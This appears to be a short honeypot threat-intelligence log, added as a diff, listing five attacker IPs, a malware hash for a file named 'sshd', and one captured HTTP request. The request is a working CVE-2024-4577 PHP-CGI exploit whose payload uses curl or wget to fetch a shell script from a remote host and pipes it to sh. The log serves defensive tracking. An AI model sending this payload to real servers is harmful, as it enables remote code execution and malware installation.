@@ -1,0 +1,26 @@
+Top 5 IPs for 12-07-2024 :
+
+43.153.68.27
+128.199.182.19
+103.41.99.94
+164.90.218.215
+151.80.149.86
+
+Malware Observed:
+File name: sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+Commands/exploits observed:
+
+POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+User-Agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0
+Host: <HOST-IP>
+Accept: */*
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+
+<?php shell_exec("X=\$(curl http://185.172.128.93/sh || wget -O- http://185.172.128.93/sh); echo \"\$X\" | sh -s cve_2024_4577"); echo(md5("Hello CVE-2024-4577")); ?>
